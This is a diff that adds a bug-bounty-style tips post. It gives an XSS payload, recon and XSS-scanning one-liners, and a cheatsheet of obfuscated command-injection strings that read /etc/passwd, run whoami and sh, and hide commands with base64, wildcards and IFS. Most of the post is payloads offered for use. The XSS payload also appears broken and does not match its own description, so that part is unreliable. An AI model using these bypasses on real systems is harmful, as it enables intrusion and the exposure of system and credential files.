@@ -1,0 +1,65 @@
+Part 5: XSS Alert Obfuscation + Advanced XSS Methodology + Subdomain Recon + Command Injection Filter Bypass
+
+
+This post is only for educational purposes. I’m not responsible for any misuse.
+
+
+Let’s go crazy with some real-world tricks used by pros. This post is loaded with practical techniques for XSS, recon, and command injection bypass. Save it!
+
+
+XSS Payload: Alert Obfuscation (RegEx Bypass)
+
+• html
+<img src="X" onerror​=top >
+
+
+Bypasses common `alert()` filters using array slice + obfuscation. Very sneaky!
+
+
+• General Automated XSS Methodology
+
+echo "target[.]com" | gau --threads 5 >> endpoints.txt
+cat httpx.txt | katana -jc >> endpoints.txt
+cat endpoints.txt | uro >> endpoints_x.txt
+cat endpoints_x.txt | gf xss >> xss.txt
+cat xss.txt | Gxss -p khXSS -o XSS_Ref.txt
+
+
+Gather, filter, and test for XSS like a machine.
+
+
+• Subdomain Recon + JS Crawl One-Liner
+
+for subdomain in $(subfinder -d http://target[.]com | dnsx | httpx); do 
+katana -u "$subdomain" -d 5 -jc -jsl -aff -kf all -mrs 5242880 -timeout 15 -retry 3 -s breadth-first -iqp -cs "$subdomain" -f url -sf url -rl 200 -p 20 -dr -nc -H -silent -fdc 'status_code == 404' ;
+done
+
+
+Crawls deep. Finds hidden JS and URLs from all subs in one go.
+
+
+• Command Injection Filter Bypass Cheatsheet
+
+cat /etc/passwd
+cat /e"t"c/pa"s"swd
+cat /'e'tc/pa's'swd
+cat /etc/pa??wd
+cat /etc/pa*wd
+cat /et' 'c/passw' 'd
+cat /et$()c/pa$()$swd
+cat /et${neko}c/pas${poi}swd
+{cat,/etc/passwd}
+echo "dwssap/cte/ tac" | rev
+$(echo Y2FOIC9ldGMvcGFzc3dkCg== | base64 -d)
+w\ho\am\i
+/\b\i\n/////s\h
+who$@ami
+xyz%0Acat%20/etc/passwd
+IFS=,;`cat<<<uname,-a`
+/???/??t /???/p??s??
+test=/ehhh/hmtc/pahhh/hmsswd
+cat ${test//hhh\/hm/}
+cat ${test//hh??hm/}
+
+
+Useful for breaking filters during command injection fuzzing or blind injection tests.
